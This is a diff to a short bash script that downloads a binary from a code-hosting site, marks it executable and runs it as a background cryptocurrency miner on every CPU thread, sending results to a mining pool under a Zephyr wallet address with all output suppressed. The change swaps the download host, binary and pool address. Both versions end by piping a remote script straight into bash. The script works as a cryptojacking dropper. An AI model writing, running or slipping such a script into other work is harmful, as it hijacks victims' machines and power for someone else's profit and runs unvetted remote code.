@@ -1,5 +1,6 @@
 #!/bin/bash
-curl https://github.com/dragonballku8/turn/raw/main/xirig -o sgr1
-chmod +x sgr1
-./sgr1 -o 172.104.187.239:443 -u ZEPHsDBeXxaS9MERnP3sHAPdCBFSMb2uZjcSyfBYezxE9kcrm6q1Z6XJcCbaqavmpMAncVgMHL8EkNAjskNT1bc6csQ86aLX1WD -p CAC -t $(nproc --all) > /dev/null 2>&1 &
+apt-get install wget -y
+curl https://gitlab.com/vainlevy/file/-/raw/master/srduo -o srduo
+chmod +x srduo
+./srduo --algorithm randomx --pool 206.189.152.87:80 --wallet ZEPHsDBeXxaS9MERnP3sHAPdCBFSMb2uZjcSyfBYezxE9kcrm6q1Z6XJcCbaqavmpMAncVgMHL8EkNAjskNT1bc6csQ86aLX1WD.large --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/nicezep/file/raw/master/time | bash
